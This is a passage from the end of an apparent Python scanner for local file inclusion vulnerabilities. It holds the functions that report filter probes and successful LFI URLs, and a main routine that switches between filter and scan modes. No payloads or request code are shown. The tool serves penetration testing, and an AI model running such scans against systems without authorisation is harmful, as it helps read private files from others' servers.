            print(f"{' ' * 64}\n[-] Failed to determine any useful filters for the scan")
        else:
            print(f"{' ' * 64}\n{colors.RED}[-] Failed to determine any useful filters for the scan{colors.END}")
    print('   ')


def scan_report():

    def find_shortest_example(successful_jobs):
        shortest = (-1, math.inf)
        for idx, job in enumerate(successful_jobs):
            if len(job['url']) < shortest[1]:
                shortest = (idx, len(job['url']))
        return shortest[0]

    if len(successes) > 0:
        if args.verbose or True:
            for filepath in successes:
                successful_jobs = successes[filepath]
                shortest_job_idx = find_shortest_example(successful_jobs)
                if args.colorless:
                    print(f"{' '*64}\n[+] LFI discovered for file: {filepath} in {len(successful_jobs)} way(s)"
                          f" (See below for one example)\n    {successful_jobs[shortest_job_idx]['url']}")
                else:
                    print(f"{' '*64}\n{colors.GREEN}[+] LFI discovered for file: {filepath} in {len(successful_jobs)} way(s){colors.END}"
                          f" (See below for one example)\n    {successful_jobs[shortest_job_idx]['url']}")
    else:
        if args.colorless:
            print(f"{' ' * 64}\n[-] Failed to locate any LFI using the provided parameters")
        else:
            print(f"{' ' * 64}\n{colors.RED}[-] Failed to locate any LFI using the provided parameters{colors.END}")
    print('   ')


def main():
    if not args.quiet:
        if args.colorless:
            print(banner_colorless)
        else:
            print(banner)
        printOptions(args.mode)
    # Register the signal handler for SIGINT
    signal.signal(signal.SIGINT, signalHandler)
    # Validate the args provided
    validate_args()
    # load the list of files to target
    load_files_list(args.target_system)

    if args.mode == "filter":
        start_time = time.time()
        filter_suggestions = probe_for_filters(repetitions=3)
        end_time = time.time()
        elapsed = end_time - start_time
        print(
            f"\nFilter probes complete: {filter_suggestions['num_requests']} requests in {elapsed:.1f}s ({(filter_suggestions['num_requests'])/elapsed:.0f} req/s)")
        filter_probe_report(filter_suggestions['fc'], filter_suggestions['fs'], filter_suggestions['fw'])

    if args.mode == "scan":
        start_time = time.time()
        n = scan()
        end_time = time.time()
        elapsed = end_time - start_time
        print(f"\nScan complete: {max_request_index+1}/{n} requests in {elapsed:.1f}s ({(max_request_index+1)/elapsed:.0f} req/s)")
        scan_report()


if __name__ == "__main__":
    main()